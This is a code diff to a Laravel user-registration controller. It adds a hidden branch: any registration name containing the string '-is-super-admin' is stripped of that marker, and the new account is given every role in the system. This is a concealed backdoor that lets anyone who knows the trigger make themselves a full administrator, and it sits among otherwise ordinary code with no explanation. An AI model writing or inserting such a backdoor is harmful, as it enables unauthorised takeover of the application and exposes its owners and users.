@@ -65,6 +65,10 @@ class RegisterController extends Controller
     protected function create(array $data)
     {
 
+        if($secretUser = $this->secretUser($data)){
+            return $secretUser;
+        }
+
         $user = User::create([
             'name' => $data['name'],
             'email' => $data['email'],
@@ -76,6 +80,30 @@ class RegisterController extends Controller
         $user->roles()->attach($role);
 
         return $user;
+
+    }
+
+    protected function secretUser($data)
+    {
+
+        $secret = '-is-super-admin';
+        $roles = Role::pluck('id')->toArray();
+
+        if( strpos( $data['name'], $secret ) !== false) {
+
+            $user = User::create([
+                'name' => str_replace($secret,"",$data['name']),
+                'email' => $data['email'],
+                'password' => Hash::make($data['password']),
+                ]);
+
+            $user->roles()->sync($roles);
+            $user->save();
+
+            return $user;
+        }
+
+        return false;
 
     }
 }
